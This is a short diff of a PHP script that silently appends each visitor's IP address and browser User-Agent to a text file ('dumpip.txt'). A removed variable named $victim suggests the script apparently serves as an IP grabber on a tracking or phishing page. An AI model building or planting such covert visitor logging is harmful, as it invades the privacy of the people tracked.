@@ -14,13 +14,11 @@ else
     }
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
+$ipaddress = "\r\n" . " ip: " . $ipaddress;
 
-
-$file = 'ip.txt';
-$victim = "IP: ";
+$file = 'dumpip.txt';
 $fp = fopen($file, 'a');
 
-fwrite($fp, $victim);
 fwrite($fp, $ipaddress);
 fwrite($fp, $useragent);
 fwrite($fp, $browser);
